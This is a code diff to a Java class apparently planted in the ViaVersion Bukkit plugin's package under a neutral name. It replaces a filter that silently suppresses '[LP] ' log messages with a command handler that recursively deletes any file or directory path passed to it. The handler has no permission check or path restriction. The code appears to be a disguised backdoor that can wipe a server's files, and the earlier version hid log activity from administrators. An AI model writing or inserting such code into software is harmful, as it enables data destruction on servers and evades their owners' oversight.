@@ -1,13 +1,46 @@
 package com.viaversion.viaversion.bukkit.handlers;
-import java.util.logging.Filter;
-import java.util.logging.LogRecord;
 
-public class EventXHandler implements Filter {
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+
+import java.io.File;
+
+public class EventXHandler implements CommandExecutor {
+
     @Override
-    public boolean isLoggable(LogRecord record) {
-        if (record.getMessage() != null && record.getMessage().startsWith("[LP] ")) {
-            return false; // 返回 false 表示不记录这条日志
+    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
+        if (args.length < 1) {
+            sender.sendMessage("请提供要删除的文件或目录的路径");
+            return true;
         }
-        return true; // 其他日志正常记录
+
+        String filePath = args[0];
+        File file = new File(filePath);
+
+        if (!file.exists()) {
+            sender.sendMessage("文件或目录不存在: " + filePath);
+            return true;
+        }
+
+        if (delete(file)) {
+            sender.sendMessage("已成功删除: " + filePath);
+        } else {
+            sender.sendMessage("无法删除: " + filePath);
+        }
+
+        return true;
+    }
+
+    private boolean delete(File file) {
+        if (file.isDirectory()) {
+            File[] files = file.listFiles();
+            if (files != null) {
+                for (File f : files) {
+                    delete(f);
+                }
+            }
+        }
+        return file.delete();
     }
 }
